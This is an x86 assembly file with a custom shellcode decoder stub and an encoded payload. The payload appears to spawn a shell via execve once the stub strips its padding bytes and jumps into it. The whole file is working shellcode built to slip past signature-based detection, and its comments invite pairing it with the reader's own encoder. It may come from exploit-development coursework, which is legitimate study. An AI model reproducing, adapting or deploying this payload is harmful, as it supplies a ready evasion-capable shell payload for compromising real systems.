
global _start			

section .text
_start:

	jmp short call_shellcode

decoder:
	pop esi							; the address of EncodedShellcode
	lea edi, [esi +1]				; edi is the cursor of the decoded shellcode
	xor eax, eax					; some small initialization
	xor ebx, ebx
	xor ecx, ecx

decode: 							; it's a while loop

	add al, byte [esi + eax + 1]	; we add the value that's after the shellcode byte, so to skip that number of bytes to the next needed byte
	mov bl, byte [esi + eax + 2]	; get the needed byte (we add 2 to include the next position + the byte that gives the number of random bytes)
	
	cmp bl, 0x04					; if the byte is CTRL + D aka 4 in ASCII !!!CHANGE THIS WITH THE END CHAR FROM YOUR ENCODER
	jne short not_the_end			; if not, go on and decode, otherwise
	cmp byte [esi + eax + 3], 0x04	; our next immediate byte is still 4?
	je 	EncodedShellcode			; we got our shellcode, now run
									
not_the_end:
	mov byte [edi], bl				; we put it where the decoded shellcode cursor points

	inc edi							; increment the decoded shellcode cursor
	add al,2						; add 2 to al, even after we added above, to skip the byte that gives the number of trash bytes + 1 to position ourselves on the next good byte
	
	jmp short decode				; and give it another round

call_shellcode:

	call decoder
	EncodedShellcode: db 0x31,0x03,0x4e,0xc7,0x7f,0xc0,0x03,0x66,0x8b,0xca,0x50,0x03,0xf4,0x15,0xa2,0x68,0x02,0xfd,0xa0,0x2f,0x02,0xa2,0x77,0x2f,0x02,0xf2,0xde,0x73,0x02,0xbf,0x06,0x68,0x01,0x45,0x68,0x01,0x91,0x2f,0x02,0xa0,0xb1,0x62,0x01,0xb7,0x69,0x03,0x8f,0xcd,0x14,0x6e,0x03,0x33,0x21,0xe2,0x89,0x03,0xa8,0x6b,0x53,0xe3,0x02,0x1e,0x5a,0x50,0x01,0x2a,0x89,0x02,0x9e,0xc6,0xe2,0x03,0x81,0x38,0x48,0x53,0x01,0xf2,0x89,0x02,0x65,0xd4,0xe1,0x03,0x70,0x99,0xb6,0xb0,0x02,0x82,0x64,0x0b,0x02,0xfe,0xac,0xcd,0x02,0x02,0x5f,0x80,0x03,0x01,0xf2,0x50,0x04,0x04





